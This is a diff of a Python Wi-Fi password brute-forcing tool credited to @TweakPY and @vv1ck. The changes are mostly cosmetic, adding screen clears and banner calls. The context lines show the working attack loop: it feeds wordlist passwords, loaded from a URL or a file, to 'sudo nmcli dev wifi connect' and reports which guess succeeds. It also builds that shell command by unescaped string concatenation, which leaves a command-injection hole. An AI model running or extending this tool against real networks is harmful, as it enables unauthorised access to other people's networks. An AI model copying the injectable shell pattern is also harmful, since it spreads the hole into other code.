@@ -9,8 +9,8 @@ def banner():
 ██║███╗██║██║██╔══╝  ██║╚════╝██╔══██╗██╔══╝  
 ╚███╔███╔╝██║██║     ██║      ██████╔╝██║     
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝   
-
-        By @TweakPY - @vv1ck        
+ 
+             By @TweakPY - @vv1ck        
 ''')
 def cls():os.system('cls' if os.name == 'nt' else 'clear')
 def developers():
@@ -61,7 +61,7 @@ def target_counter(max):
         except Exception as e:ignore=e
         print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Invalid choice: Please pick a number between 1 and " + str(max))
 def Brute_Force_Wifi(selected_network,passwords):
-    cls();print(f"{cr.rd}[{cr.rs}+{cr.rd}]{cr.rs} Attack Started \n\n\n\n");counter=0
+    cls();banner();print(f"{cr.rd}[{cr.rs}+{cr.rd}]{cr.rs} Attack Started \n\n\n");counter=0
     for password in passwords:
         password=password.strip()
         if isinstance(password,str):decoded_line=password
@@ -75,10 +75,10 @@ def Brute_Force_Wifi(selected_network,passwords):
                 if selected_network in available:contain=True
                 else:sleep(1)
             creds=os.popen("sudo nmcli dev wifi connect \""+selected_network+"\" password \""+decoded_line+"\"").read().strip()
-            if "Error:" in creds:print(cr.rd+f'\r- Attempts [ {counter} ] With Password [ {decoded_line} ] Failed ',end='');counter+=1
-            else:print(cr.gr+f'\r- Attempts [ {counter} ] With Password [ {decoded_line} ] Succeeded{cr.rs} ',end='');counter+=1;print(f"\n\n{cr.rd}[{cr.rs}+{cr.rd}]{cr.rs} We have Successfully Logged in to {selected_network} with {counter} Attempts ");NetworkINF(selected_network,decoded_line)
+            if "Error:" in creds:cls();banner();print(cr.rd+f'\r- Attempts [ {counter} ] With Password [ {decoded_line} ] Failed {cr.rs}',end='');counter+=1
+            else:cls();banner();print(cr.gr+f'\r- Attempts [ {counter} ] With Password [ {decoded_line} ] Succeeded{cr.rs} ',end='');counter+=1;print(f"\n\n{cr.rd}[{cr.rs}+{cr.rd}]{cr.rs} We have Successfully Logged in to {selected_network} with {counter} Attempts ");NetworkINF(selected_network,decoded_line)
         else:pass
-    print(f"{cr.rd}[{cr.rs}-{cr.rd}]{cr.rs} All Passwords Failed , We Will Get Them Next Time ..  ")
+    cls();banner();print(f"\n{cr.rd}[{cr.rs}-{cr.rd}]{cr.rs} All Passwords Failed , We Will Get Them Next Time ..  ")
 def main():
     cls();banner();require_rLinux()
     choice=int(input(cr.rd+'{'+cr.rs+' 1 '+cr.rd+'}'+cr.rs+'--'+cr.rd+'{'+cr.rs+' Passwords From url  '+cr.rd+'}'+cr.rs+'\n'+cr.rd+'{'+cr.rs+' 2 '+cr.rd+'}'+cr.rs+'--'+cr.rd+'{'+cr.rs+' Passwords From File '+cr.rd+'}'+cr.rs+'\n'+cr.rd+'{'+cr.rs+' 0 '+cr.rd+'}'+cr.rs+'--'+cr.rd+'{'+cr.rs+' Developers          '+cr.rd+'}'+cr.rs+'\n\n'+f'{cr.rd}[{cr.rs}?{cr.rd}]{cr.rs}'+f' Enter :{cr.rd} '));print(cr.rs)
